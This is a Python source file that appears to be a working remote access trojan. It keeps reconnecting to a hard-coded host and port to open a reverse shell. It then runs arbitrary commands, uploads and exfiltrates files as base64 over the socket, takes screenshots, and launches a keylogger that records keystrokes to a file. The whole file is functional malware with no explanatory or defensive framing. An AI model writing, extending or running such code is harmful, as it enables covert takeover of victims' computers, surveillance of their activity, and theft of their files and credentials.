import socket
import subprocess
import os
import time
import threading
import pynput.keyboard
import base64
from PIL import ImageGrab  # Windows için; Linux'ta scrot kullanılacak

HOST = '10.11.10.1'
PORT = 4445

def reliable_connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            shell(s)
        except:
            time.sleep(5)

def send_data(sock, data):
    if isinstance(data, str):
        data = data.encode()
    sock.send(data)

def download_file(sock, path):
    if os.path.exists(path):
        with open(path, "rb") as f:
            sock.send(base64.b64encode(f.read()))
    else:
        send_data(sock, "[!] File not found.")

def upload_file(sock, filename):
    try:
        data = sock.recv(100000)
        with open(filename, "wb") as f:
            f.write(base64.b64decode(data))
        send_data(sock, "[+] File uploaded.")
    except:
        send_data(sock, "[!] Upload failed.")

def screenshot(sock):
    try:
        subprocess.call("scrot screenshot.png", shell=True)
        with open("screenshot.png", "rb") as f:
            sock.send(base64.b64encode(f.read()))
        os.remove("screenshot.png")
    except Exception as e:
        send_data(sock, f"[!] Screenshot failed: {str(e)}")

def keylogger():
    def on_press(key):
        with open("keys.txt", "a") as f:
            f.write(str(key) + "\n")
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

def shell(s):
    keylogger_started = False
    while True:
        try:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            elif command.startswith('cd '):
                os.chdir(command[3:])
                send_data(s, "[+] Directory changed.")
            elif command.startswith('download '):
                download_file(s, command[9:])
            elif command.startswith('upload '):
                upload_file(s, command[7:])
            elif command == 'screenshot':
                screenshot(s)
            elif command == 'keylogger':
                if not keylogger_started:
                    threading.Thread(target=keylogger, daemon=True).start()
                    keylogger_started = True
                    send_data(s, "[+] Keylogger started.")
                else:
                    send_data(s, "[*] Keylogger already running.")
            else:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                send_data(s, output)
        except Exception as e:
            send_data(s, f"[!] Error: {str(e)}")
            continue
    s.close()

reliable_connect()

